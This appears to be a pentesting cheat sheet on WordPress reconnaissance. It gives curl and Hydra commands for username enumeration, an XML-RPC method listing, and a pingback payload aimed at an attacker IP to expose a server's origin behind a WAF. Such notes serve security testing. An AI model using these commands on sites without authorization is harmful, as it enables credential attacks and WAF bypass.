# Enumeration

## Username Enumeration

### Manual

Manual enumeration via JSON.

```
$ curl -s http[s]://<target_IP>/?rest_route=/wp/v2/users | jq

$ curl -shttp[s]://<target_IP>/wp-json/wp/v2/users | jq
```

### Hydra

Using a password cracker to enumerate usernames by returning an error as a response that the account is valid.

```
$ hydra -V -L users.lst -p password <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

## Enumerate Methods

```xml
<methodCall>
	<methodName>system.listMethods</methodName>
	<params></params>
</methodCall>
```

Here are the available methods but without the XML tags.

```
system.multicall
system.listMethods
system.getCapabilities
demo.addTwoNumbers
demo.sayHello
pingback.extensions.getPingbacks
pingback.ping
mt.publishPost
mt.getTrackbackPings
mt.supportedTextFilters
mt.supportedMethods
mt.setPostCategories
mt.getPostCategories
mt.getRecentPostTitles
mt.getCategoryList
metaWeblog.getUsersBlogs
metaWeblog.deletePost
metaWeblog.newMediaObject
metaWeblog.getCategories
metaWeblog.getRecentPosts
metaWeblog.getPost
metaWeblog.editPost
metaWeblog.newPost
blogger.deletePost
blogger.editPost
blogger.newPost
blogger.getRecentPosts
blogger.getPost
blogger.getUserInfo
blogger.getUsersBlogs
wp.restoreRevision
wp.getRevisions
wp.getPostTypes
wp.getPostType
wp.getPostFormats
wp.getMediaLibrary
wp.getMediaItem
wp.getCommentStatusList
wp.newComment
wp.editComment
wp.deleteComment
wp.getComments
wp.getComment
wp.setOptions
wp.getOptions
wp.getPageTemplates
wp.getPageStatusList
wp.getPostStatusList
wp.getCommentCount
wp.deleteFile
wp.uploadFile
wp.suggestCategories
wp.deleteCategory
wp.newCategory
wp.getTags
wp.getCategories
wp.getAuthors
wp.getPageList
wp.editPage
wp.deletePage
wp.newPage
wp.getPages
wp.getPage
wp.editProfile
wp.getProfile
wp.getUsers
wp.getUser
wp.getTaxonomies
wp.getTaxonomy
wp.getTerms
wp.getTerm
wp.deleteTerm
wp.editTerm
wp.newTerm
wp.getPosts
wp.getPost
wp.deletePost
wp.editPost
wp.newPost
wp.getUsersBlogs

```

## Cross Site Port Attack (XSPA)

This can be used for to check the origin IP address of the server to bypass WAF (i.e. Cloudflare) to perform network enumeration such as port scans. This can be achieved by using a webhook like [PostBin](https://www.postb.in/) or an external attacker IP address to the send the request. Once it returns **HTTP 200** responded. You should to see the results.

```xml
<methodCall>
	<methodName>pingback.ping</methodName>
	<params>
		<param>
			<value><string>http[s]://<attacker_IP>/</string></value>
		</param>
		<param>
			<value><string>https://example.com/</string></value>
		</param>
	</params>
</methodCall>
```